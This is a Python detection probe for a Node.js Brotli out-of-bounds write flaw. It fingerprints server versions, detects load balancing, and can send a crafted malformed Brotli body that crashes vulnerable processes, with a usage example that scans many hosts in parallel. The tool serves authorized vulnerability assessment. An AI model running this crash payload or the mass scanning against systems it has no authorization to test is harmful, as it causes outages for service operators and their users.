#!/usr/bin/env python3
"""
CVE-2026-111497 (Node2Shell / HTTP2Shell) — Uncredentialed Detection Probe
Authorized Engagement Use Only

Detection strategy (risk-ordered):
  1. Version fingerprinting — zero risk, exhaustive
       - Standard headers (X-Powered-By, Server, Via)
       - OPTIONS / HEAD method responses
       - Common disclosure paths (/version, /health, etc.)
       - Error page probing (404/405 responses often include stack traces)
  2. Cluster / LB detection — zero risk
       - Multiple HEAD requests; look for varied X-Request-ID, X-Served-By,
         pod/instance identifiers, inconsistent ETags
       - If clustering confirmed, behavioral probe operational risk → near zero
         (crashed worker restarts in <1s; no user-visible outage)
  3. Behavioral Brotli probe — requires --brotli-probe flag
       - REQUIRES explicit authorization
       - Sends malformed Brotli body that targets the block-switch OOB path
       - Uses HTTP/1.1 keep-alive pipelining:
           same TCP connection → probe request + canary GET
           Crash: canary never responds (clean crash signal, no correlation noise)
           Patched: both requests answered cleanly
       - Immediate post-probe liveness check confirms recovery
       - Reports recovery time (fast recovery = clustered/auto-restart)

IMPORTANT:
  - Phase 3 may cause a transient process crash on vulnerable single-worker apps.
  - On clustered apps (k8s, pm2, systemd restart) crash is typically absorbed <1s.
  - Confirm authorization before running --brotli-probe against any target.
  - This is NOT an exploit. It does not achieve code execution.

Fixed versions:
  Node.js 22.x → 22.23.4 | 24.x → 24.22.1 | 26.x → 26.12.1
  Brotli library → 1.0.10 / 1.1.1 / 1.2.1
  Node.js 18.x, 20.x → EOL, no official fix

CVE reference: https://www.tenable.com/cve/CVE-2026-111497
"""

import socket
import ssl
import sys
import re
import time
import argparse
import statistics
from urllib.parse import urlparse

# ---------------------------------------------------------------------------
# Known-fixed thresholds
# ---------------------------------------------------------------------------
FIXED_VERSIONS = {
    22: (22, 23, 4),
    24: (24, 22, 1),
    26: (26, 12, 1),
}
EOL_LINES = {18, 20, 21, 23, 25}

# ---------------------------------------------------------------------------
# Brotli probe payloads
#
# PROBE_B targets the exact OOB path fixed by upstream commit 0ed4268:
#   A literal block-switch command issued when only one literal block type
#   exists. Patched decoder → BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH (clean).
#   Vulnerable decoder → OOB write → likely process crash.
#
# This is not a working exploit. It does not defeat ASLR, control the write
# destination, or spray shellcode. The crash, if it occurs, is the signal.
# ---------------------------------------------------------------------------
PROBE_A_GARBAGE = bytes([0xFF, 0xFE, 0x00, 0x01, 0xDE, 0xAD, 0xBE, 0xEF])

PROBE_B_BLOCKSWITCH = bytes([
    0x1b,        # WBITS=22 (valid Brotli stream header)
    0x00,        # Empty first metablock (ISLAST=0, MLEN=0)
    0x02, 0x00,  # Second metablock MLEN low/high
    0x03,        # NBLTYPESL=2 (sets up two literal block types)
    0x00,        # Prefix code for block types
    0x01,        # Block-switch command: switch to type 1 (invalid — only type 0 exists)
    0x00, 0x00, 0x00,
])

# Common version disclosure paths
VERSION_PATHS = [
    "/version", "/_version", "/__version", "/api/version", "/api/v1/version",
    "/health", "/__health", "/healthz", "/health/live", "/health/ready",
    "/status", "/api/status", "/info", "/api/info", "/metrics",
    "/actuator/info", "/actuator/health",  # Spring-style (sometimes proxied via Node)
    "/ping", "/api/ping",
]

# Headers that commonly signal Node.js presence or version
NODE_HEADERS = [
    "x-powered-by", "server", "x-runtime", "via", "x-generator",
    "x-served-by", "x-node-version",
]

# Headers that signal load balancer / clustering
CLUSTER_HEADERS = [
    "x-request-id", "x-correlation-id", "x-served-by", "x-cache",
    "x-amz-cf-id", "x-amzn-trace-id", "x-forwarded-for",
    "cf-ray",               # Cloudflare
    "x-vercel-id",          # Vercel
    "fly-request-id",       # Fly.io
    "x-render-origin-server", # Render
    "x-railway-request-id", # Railway
    "x-pod-name", "x-instance-id", "x-replica-id",
]

# ---------------------------------------------------------------------------
# Terminal colors
# ---------------------------------------------------------------------------
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"
B = "\033[94m"; BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"

def tag(level):
    return {"info": f"{C}[*]{RESET}", "ok": f"{G}[+]{RESET}",
            "warn": f"{Y}[!]{RESET}", "fail": f"{R}[-]{RESET}"}.get(level, "[?]")

# ---------------------------------------------------------------------------
# Low-level HTTP
# ---------------------------------------------------------------------------

def open_sock(host, port, use_tls, timeout):
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _raw_request(method, path, host, port, extra_headers=None, body=b""):
    hdrs = {
        "Host": f"{host}:{port}",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "node2shell-probe/2.0 (CVE-2026-111497)",
    }
    if extra_headers:
        hdrs.update(extra_headers)
    lines = f"{method} {path} HTTP/1.1\r\n"
    lines += "\r\n".join(f"{k}: {v}" for k, v in hdrs.items())
    lines += "\r\n\r\n"
    return lines.encode() + body


def _parse(raw):
    sep = raw.find(b"\r\n\r\n")
    if sep == -1:
        return None, {}, raw
    hblock = raw[:sep].decode("utf-8", errors="replace")
    lines = hblock.split("\r\n")
    status = lines[0] if lines else ""
    hdrs = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            hdrs[k.strip().lower()] = v.strip()
    return status, hdrs, raw[sep + 4:]


def http_request(host, port, use_tls, method, path, extra_headers=None,
                 body=b"", timeout=10):
    """Single request. Returns (status, headers, body, error, latency_ms)."""
    req = _raw_request(method, path, host, port, extra_headers, body)
    t0 = time.monotonic()
    try:
        sock = open_sock(host, port, use_tls, timeout)
        sock.sendall(req)
        resp = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
        sock.close()
        lat = int((time.monotonic() - t0) * 1000)
        if not resp:
            return None, {}, b"", "empty_response", lat
        s, h, b = _parse(resp)
        return s, h, b, None, lat
    except ConnectionResetError:
        return None, {}, b"", "connection_reset", int((time.monotonic() - t0) * 1000)
    except socket.timeout:
        return None, {}, b"", "timeout", int((time.monotonic() - t0) * 1000)
    except OSError as e:
        return None, {}, b"", f"oserror:{e}", int((time.monotonic() - t0) * 1000)


def pipelined_probe(host, port, use_tls, probe_path, canary_path, timeout=10):
    """
    Pipelined probe + canary on a single keep-alive TCP connection.

    Sends two requests back-to-back on the same socket:
      Request 1: POST <probe_path> with malformed Brotli body (PROBE_B)
      Request 2: GET  <canary_path> (a benign request)

    On a PATCHED server (or one not decoding request bodies):
      Both responses arrive. We read status codes for both.

    On a VULNERABLE server (crash on OOB write):
      The connection is reset or closed after/during request 1.
      The canary response never arrives.

    This is the key risk-reduction technique: the crash signal is observed
    on the same connection, eliminating false positives from network resets,
    and we don't need a second connection to check liveness.

    Returns a dict with keys:
      probe_status     - HTTP status of probe request (None if crash)
      canary_status    - HTTP status of canary GET (None if crash)
      crash_detected   - bool
      error            - error string if connection failed
      latency_probe_ms - time to first byte of probe response
      latency_total_ms - total round-trip for both requests
    """
    brotli_body = PROBE_B_BLOCKSWITCH
    probe_req = (
        f"POST {probe_path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Accept: */*\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Encoding: br\r\n"
        f"Content-Length: {len(brotli_body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"User-Agent: node2shell-probe/2.0 (CVE-2026-111497)\r\n"
        f"\r\n"
    ).encode() + brotli_body

    canary_req = (
        f"GET {canary_path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Accept: */*\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Connection: close\r\n"
        f"User-Agent: node2shell-probe/2.0 (CVE-2026-111497)\r\n"
        f"\r\n"
    ).encode()

    result = {
        "probe_status": None, "canary_status": None,
        "crash_detected": False, "error": None,
        "latency_probe_ms": None, "latency_total_ms": None,
    }
    t0 = time.monotonic()

    try:
        sock = open_sock(host, port, use_tls, timeout)
        # Send both requests before reading — pipelining
        sock.sendall(probe_req + canary_req)

        # Read all data until connection closes
        buf = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                buf += chunk
                if result["latency_probe_ms"] is None and len(buf) > 12:
                    result["latency_probe_ms"] = int((time.monotonic() - t0) * 1000)
            except socket.timeout:
                break
        sock.close()

    except ConnectionResetError:
        result["error"] = "connection_reset"
        result["crash_detected"] = True
        result["latency_total_ms"] = int((time.monotonic() - t0) * 1000)
        return result
    except Exception as e:
        result["error"] = str(e)
        result["latency_total_ms"] = int((time.monotonic() - t0) * 1000)
        return result

    result["latency_total_ms"] = int((time.monotonic() - t0) * 1000)

    if not buf:
        result["crash_detected"] = True
        result["error"] = "no_response"
        return result

    # Parse first response (probe)
    sep1 = buf.find(b"\r\n\r\n")
    if sep1 != -1:
        probe_header = buf[:sep1].decode("utf-8", errors="replace")
        first_line = probe_header.split("\r\n")[0]
        parts = first_line.split(" ", 2)
        if len(parts) > 1:
            try:
                result["probe_status"] = int(parts[1])
            except ValueError:
                pass

    # Check for canary response — look for a second HTTP/ header after the first
    second_response_start = buf.find(b"HTTP/", sep1 + 4 if sep1 != -1 else 0)
    if second_response_start != -1:
        second_line = buf[second_response_start:second_response_start + 64]
        m = re.search(rb'HTTP/[\d.]+ (\d{3})', second_line)
        if m:
            result["canary_status"] = int(m.group(1))
    else:
        # No second HTTP response found
        if result["probe_status"] is not None:
            # Got probe response but no canary — possible crash after probe response
            result["crash_detected"] = True
            result["error"] = "canary_missing_after_probe_response"

    # If we got both responses, definitely no crash
    if result["probe_status"] is not None and result["canary_status"] is not None:
        result["crash_detected"] = False

    # If we got no probe response at all, crash
    if result["probe_status"] is None and not result["error"]:
        result["crash_detected"] = True
        result["error"] = "no_probe_response"

    return result


# ---------------------------------------------------------------------------
# Version parsing / verdict
# ---------------------------------------------------------------------------

def parse_version(s):
    m = re.search(r'(\d+)\.(\d+)\.(\d+)', s)
    return tuple(int(x) for x in m.groups()) if m else None


def version_verdict(vt):
    if not vt:
        return "unknown", "Could not parse version"
    major = vt[0]
    vs = ".".join(str(x) for x in vt)
    if major in EOL_LINES or major < min(FIXED_VERSIONS):
        return "vulnerable", f"v{vs} is EOL — no official fix"
    if major in FIXED_VERSIONS:
        fv = FIXED_VERSIONS[major]
        fvs = ".".join(str(x) for x in fv)
        if vt < fv:
            return "vulnerable", f"v{vs} < {fvs} — upgrade to {fvs}"
        return "patched", f"v{vs} is patched (≥ {fvs})"
    return "unknown", f"v{vs} — unrecognized release line"


def extract_node_version(headers, body_bytes):
    text = "\n".join(f"{k}: {v}" for k, v in headers.items())
    try:
        text += "\n" + body_bytes[:8192].decode("utf-8", errors="replace")
    except Exception:
        pass
    patterns = [
        r'[Nn]ode(?:\.?[Jj][Ss])?[/\s:"\']+v?(\d+\.\d+\.\d+)',
        r'"node(?:js)?"\s*:\s*"v?(\d+\.\d+\.\d+)"',
        r'node/(\d+\.\d+\.\d+)',
        r'Express.*?Node[/\s]+v?(\d+\.\d+\.\d+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return parse_version(m.group(1))
    return None


# ---------------------------------------------------------------------------
# Cluster / LB detection
# ---------------------------------------------------------------------------

def detect_clustering(host, port, use_tls, path, n=4, timeout=6):
    """
    Make n HEAD requests and look for signs of load balancing / clustering.
    Returns (clustered: bool, evidence: list[str], confidence: str).
    """
    responses = []
    for _ in range(n):
        s, h, _, err, lat = http_request(host, port, use_tls, "HEAD", path,
                                         timeout=timeout)
        if not err:
            responses.append((h, lat))
        time.sleep(0.1)

    if len(responses) < 2:
        return False, ["insufficient responses"], "low"

    evidence = []
    clustered = False

    # Varying X-Request-ID / trace headers
    for hdr in CLUSTER_HEADERS:
        vals = list({r[0].get(hdr) for r in responses if hdr in r[0]})
        if len(vals) > 1:
            evidence.append(f"varying {hdr} ({len(vals)} distinct values)")
            clustered = True
        elif len(vals) == 1 and vals[0]:
            evidence.append(f"static LB header: {hdr}: {vals[0][:40]}")
            clustered = True

    # ETag variation (inconsistent backend state = multiple instances)
    etags = list({r[0].get("etag") for r in responses if "etag" in r[0]})
    if len(etags) > 1:
        evidence.append(f"ETag varies across requests ({len(etags)} values)")
        clustered = True

    # Via / X-Forwarded headers
    for hdr in ("via", "x-forwarded-for", "forwarded"):
        val = responses[0][0].get(hdr, "")
        if val:
            evidence.append(f"proxied: {hdr}: {val[:60]}")
            clustered = True

    # Server header suggests managed platform
    server = responses[0][0].get("server", "").lower()
    for indicator in ("nginx", "apache", "caddy", "cloudflare", "vercel",
                      "render", "fly", "awselb", "akamai", "fastly"):
        if indicator in server:
            evidence.append(f"reverse proxy detected: Server: {server}")
            clustered = True
            break

    # Latency variance — very high variance suggests multiple backends
    lats = [r[1] for r in responses]
    if len(lats) >= 3:
        stdev = statistics.stdev(lats)
        mean = statistics.mean(lats)
        cv = stdev / mean if mean > 0 else 0
        if cv > 0.5:
            evidence.append(f"high latency variance (CV={cv:.2f}) — possible multiple backends")
            # Don't set clustered=True on this alone; too noisy

    confidence = "high" if len(evidence) >= 2 else ("medium" if evidence else "low")
    return clustered, evidence, confidence


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run(args):
    target = args.target
    if not target.startswith("http"):
        target = "http://" + target
    parsed = urlparse(target)
    scheme = parsed.scheme
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    use_tls = (scheme == "https")
    base_path = parsed.path or "/"

    print("=" * 68)
    print("  CVE-2026-111497 (Node2Shell)")
    print("=" * 68)
    print(f"  Target  : {host}:{port}  ({'TLS' if use_tls else 'plaintext'})")
    print(f"  Path    : {base_path}")
    print(f"  Time    : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 68)

    node_version = None
    version_from = None
    uses_brotli_response = False

    # ---------------------------------------------------------------
    # Stage 1: Version fingerprinting (zero risk)
    # ---------------------------------------------------------------
    print(f"\n{BOLD}Stage 1: Version Fingerprinting (zero risk){RESET}")

    # 1a. GET base path
    print(f"  {tag('info')} GET {base_path}")
    sl, hdrs, body, err, lat = http_request(host, port, use_tls, "GET", base_path,
                                             timeout=args.timeout)
    if err:
        print(f"  {tag('fail')} Connection failed: {err}")
        sys.exit(1)

    code = int(sl.split()[1]) if sl and len(sl.split()) > 1 else None
    print(f"  {tag('info')} {sl}  ({lat}ms)")

    if "br" in hdrs.get("content-encoding", "").split(","):
        uses_brotli_response = True
        print(f"  {tag('ok')} Server sends Brotli responses (Content-Encoding: br)")

    for h in NODE_HEADERS:
        if h in hdrs:
            print(f"  {tag('info')} {h}: {hdrs[h]}")

    v = extract_node_version(hdrs, body)
    if v:
        node_version, version_from = v, f"GET {base_path} headers/body"
        print(f"  {tag('ok')} Node.js v{'.'.join(str(x) for x in v)} (from response)")

    # 1b. HEAD request (different code path, sometimes different headers)
    if not node_version:
        sl_h, hdrs_h, _, err_h, _ = http_request(host, port, use_tls, "HEAD", base_path,
                                                   timeout=args.timeout)
        if not err_h:
            v = extract_node_version(hdrs_h, b"")
            if v:
                node_version, version_from = v, f"HEAD {base_path}"
                print(f"  {tag('ok')} Node.js v{'.'.join(str(x) for x in v)} (from HEAD)")

    # 1c. OPTIONS (sometimes reveals version in Allow header context or body)
    if not node_version:
        sl_o, hdrs_o, body_o, err_o, _ = http_request(host, port, use_tls, "OPTIONS",
                                                        base_path, timeout=args.timeout)
        if not err_o:
            v = extract_node_version(hdrs_o, body_o)
            if v:
                node_version, version_from = v, f"OPTIONS {base_path}"
                print(f"  {tag('ok')} Node.js v{'.'.join(str(x) for x in v)} (from OPTIONS)")

    # 1d. 404 probe — error pages often include stack trace with Node version
    if not node_version:
        fake_path = "/probe-404-xyzzy"
        sl_404, hdrs_404, body_404, err_404, _ = http_request(
            host, port, use_tls, "GET", fake_path, timeout=args.timeout)
        if not err_404 and body_404:
            v = extract_node_version(hdrs_404, body_404)
            if v:
                node_version, version_from = v, f"404 error page {fake_path}"
                print(f"  {tag('ok')} Node.js v{'.'.join(str(x) for x in v)} "
                      f"(from 404 error page — likely dev mode)")

    # 1e. Version path sweep
    if not node_version and args.sweep:
        print(f"\n  {tag('info')} Sweeping {len(VERSION_PATHS)} disclosure paths...")
        for vpath in VERSION_PATHS:
            sl2, hdrs2, body2, err2, _ = http_request(
                host, port, use_tls, "GET", vpath,
                timeout=max(3, args.timeout // 2))
            c2 = int(sl2.split()[1]) if sl2 and len(sl2.split()) > 1 else None
            if err2 or c2 in (404, 403, 405, None):
                continue
            v = extract_node_version(hdrs2, body2)
            if v:
                node_version, version_from = v, f"GET {vpath} ({c2})"
                print(f"  {tag('ok')} Node.js v{'.'.join(str(x) for x in v)} at {vpath}")
                break
            if c2 and c2 < 400:
                snippet = body2[:100].decode("utf-8", errors="replace").replace("\n", " ")
                print(f"  {tag('info')} {vpath} → {c2}  {DIM}{snippet[:80]}{RESET}")

    # ---------------------------------------------------------------
    # Stage 2: Cluster / LB detection (zero risk)
    # ---------------------------------------------------------------
    print(f"\n{BOLD}Stage 2: Cluster / LB Detection (zero risk){RESET}")
    clustered, cl_evidence, cl_confidence = detect_clustering(
        host, port, use_tls, base_path, n=4, timeout=args.timeout)

    if clustered:
        print(f"  {tag('ok')} Clustering / LB detected (confidence: {cl_confidence})")
        for ev in cl_evidence:
            print(f"         {G}→{RESET} {ev}")
        print(f"  {tag('info')} Behavioral probe operational risk: "
              f"{G}LOW{RESET} (worker crash absorbed by restart)")
    else:
        print(f"  {tag('info')} No clustering evidence found (confidence: {cl_confidence})")
        if cl_evidence:
            for ev in cl_evidence:
                print(f"         → {ev}")
        print(f"  {tag('warn')} Behavioral probe operational risk: "
              f"{Y}MODERATE{RESET} (may cause brief outage on single-worker apps)")

    # ---------------------------------------------------------------
    # Stage 3: Behavioral Brotli probe
    # ---------------------------------------------------------------
    probe_result = None
    probe_details = {}

    if args.brotli_probe:
        probe_path = args.probe_path or base_path
        canary_path = base_path  # canary uses base path — known-good endpoint

        print(f"\n{BOLD}Stage 3: Behavioral Brotli Probe{RESET}")
        print(f"  {tag('info')} Probe path  : {probe_path}")
        print(f"  {tag('info')} Canary path : {canary_path}")

        # Phase A: confirm server decodes request bodies on this path
        # Use PROBE_A (obviously garbage) — zero crash risk, just confirms decoding
        print(f"\n  {tag('info')} Phase A — confirm Brotli request-body decoding active")
        phA_body = PROBE_A_GARBAGE
        phA_hdrs = {
            "Content-Type": "application/octet-stream",
            "Content-Encoding": "br",
            "Content-Length": str(len(phA_hdrs_body := phA_body)),
            "Connection": "close",
        }
        sl_a, hdrs_a, _, err_a, lat_a = http_request(
            host, port, use_tls, "POST", probe_path,
            extra_headers={
                "Content-Type": "application/octet-stream",
                "Content-Encoding": "br",
                "Content-Length": str(len(PROBE_A_GARBAGE)),
                "Connection": "close",
            },
            body=PROBE_A_GARBAGE,
            timeout=args.timeout)

        code_a = int(sl_a.split()[1]) if sl_a and len(sl_a.split()) > 1 else None

        if err_a == "connection_reset":
            print(f"  {tag('warn')} Phase A: Connection reset on trivially invalid Brotli")
            print(f"           Unexpected — target may already be unstable.")
            probe_result = "indeterminate"

        elif code_a in (400, 415, 422, 500):
            print(f"  {tag('ok')} Phase A: Server returned {code_a} for invalid Brotli "
                  f"→ decoding is active ({lat_a}ms)")

            # Phase B: pipelined block-switch OOB probe + canary
            print(f"\n  {tag('info')} Phase B — pipelined OOB probe + canary (same TCP connection)")
            print(f"  {tag('info')} Sending probe + canary back-to-back on keep-alive socket...")

            pr = pipelined_probe(host, port, use_tls, probe_path, canary_path,
                                 timeout=args.timeout)
            probe_details = pr

            print(f"  {tag('info')} Probe status  : "
                  f"{pr['probe_status'] if pr['probe_status'] else '(none)'}")
            print(f"  {tag('info')} Canary status : "
                  f"{pr['canary_status'] if pr['canary_status'] else '(none)'}")
            print(f"  {tag('info')} Total latency : {pr['latency_total_ms']}ms")

            if pr["crash_detected"]:
                err_str = pr.get("error", "")
                print(f"  {tag('warn')} {R}{BOLD}CRASH DETECTED{RESET} — {err_str}")
                print(f"           Probe sent; canary never answered on same connection.")
                print(f"           {Y}This is a strong indicator of vulnerable Brotli decoder.{RESET}")
                probe_result = "likely_vulnerable"

                # Liveness check — how long until recovery?
                print(f"\n  {tag('info')} Checking recovery / liveness...")
                recovered = False
                for attempt in range(1, 7):
                    time.sleep(0.5 * attempt)
                    sl_r, _, _, err_r, lat_r = http_request(
                        host, port, use_tls, "HEAD", base_path, timeout=5)
                    if not err_r and sl_r:
                        print(f"  {tag('ok')} Recovered after ~{int(0.5 * attempt * (attempt+1) / 2 * 1000)}ms "
                              f"— {sl_r} ({lat_r}ms)")
                        if not clustered:
                            print(f"  {tag('info')} Fast recovery despite no LB detected — "
                                  f"likely process manager (pm2/systemd) auto-restarted")
                        recovered = True
                        break
                if not recovered:
                    print(f"  {tag('warn')} Target still unresponsive after 10s — "
                          f"manual check recommended")

            else:
                print(f"  {tag('ok')} {G}NO CRASH{RESET} — both probe and canary answered "
                      f"on same connection")
                print(f"           Decoder handled malformed stream cleanly.")
                print(f"           {G}Suggests patched decoder or path not decoding "
                      f"request bodies.{RESET}")
                probe_result = "likely_patched_or_not_applicable"

        elif code_a == 405:
            print(f"  {tag('info')} Phase A: 405 Method Not Allowed — try --probe-path "
                  f"with a POST-accepting endpoint")
            probe_result = "not_applicable"

        elif code_a and code_a < 400:
            print(f"  {tag('info')} Phase A: {code_a} — path may not be decoding request bodies")
            print(f"           Use --probe-path to specify a POST endpoint (upload, submit, etc.)")
            probe_result = "not_applicable"

        else:
            print(f"  {tag('info')} Phase A: {sl_a or err_a} — indeterminate")
            probe_result = "indeterminate"

    # ---------------------------------------------------------------
    # Verdict
    # ---------------------------------------------------------------
    print(f"\n{'=' * 68}")
    print(f"  {BOLD}VERDICT{RESET}")
    print(f"{'=' * 68}")

    if node_version:
        status, msg = version_verdict(node_version)
        src = f"  (source: {version_from})" if version_from else ""
        if status == "vulnerable":
            print(f"  {tag('warn')} {R}{BOLD}VULNERABLE{RESET}    {msg}{src}")
        elif status == "patched":
            print(f"  {tag('ok')} {G}PATCHED{RESET}       {msg}{src}")
        else:
            print(f"  {tag('info')} INCONCLUSIVE  {msg}{src}")
    else:
        print(f"  {tag('info')} NO VERSION DETECTED from headers or paths")

    if probe_result:
        labels = {
            "likely_vulnerable":              f"{R}CRASH INDICATOR{RESET}  — behavioral probe indicates vulnerable decoder",
            "likely_patched_or_not_applicable": f"{G}NO CRASH{RESET}          — decoder handled malformed stream cleanly",
            "not_applicable":                  "NOT APPLICABLE    — path does not decode Brotli request bodies",
            "indeterminate":                   "INDETERMINATE     — probe result inconclusive",
        }
        print(f"  {tag('info')} Behavioral:   {labels.get(probe_result, probe_result)}")

    print(f"\n  Brotli response encoding : {'YES' if uses_brotli_response else 'not confirmed'}")
    print(f"  Clustering / LB detected : {'YES (' + cl_confidence + ' confidence)' if clustered else 'NO'}")

    if not node_version and not args.brotli_probe:
        print(f"\n  {tag('info')} Next steps:")
        print(f"           --sweep          probe {len(VERSION_PATHS)} version disclosure paths")
        print(f"           --brotli-probe   behavioral probe (requires authorization)")
        print(f"           --probe-path     specify a POST endpoint (upload, form submit, etc.)")

    print(f"\n  Fix : Node.js 22.23.4 / 24.22.1 / 26.12.1 | Brotli 1.0.10 / 1.1.1 / 1.2.1")
    print(f"  Ref : https://www.tenable.com/cve/CVE-2026-111497")
    print()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-111497 (Node2Shell) detection probe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Risk levels by flag combination:
  (no flags)                  → ZERO risk  — headers only
  --sweep                     → ZERO risk  — adds path enumeration
  --sweep --brotli-probe      → LOW risk if clustering detected,
                                MODERATE if single-worker detected
  --brotli-probe --probe-path → Direct to known POST endpoint

Examples:
  %(prog)s https://target.example.com
  %(prog)s https://target.example.com --sweep
  %(prog)s https://target.example.com --sweep --brotli-probe
  %(prog)s https://target.example.com --brotli-probe --probe-path /api/data
  cat hosts.txt | xargs -P4 -I{} %(prog)s {} --sweep
        """
    )
    parser.add_argument("target",
                        help="Target (https://host:port/path or host:port)")
    parser.add_argument("--sweep", action="store_true",
                        help="Sweep version disclosure paths (zero risk)")
    parser.add_argument("--brotli-probe", action="store_true",
                        help="Behavioral probe — send malformed Brotli, observe crash vs. "
                             "clean error on same connection. Requires authorization.")
    parser.add_argument("--probe-path", default=None,
                        help="Endpoint for POST Brotli probe (default: base path). "
                             "Pick one that accepts POST bodies.")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Socket timeout in seconds (default: 10)")
    args = parser.parse_args()
    run(args)


if __name__ == "__main__":
    main()
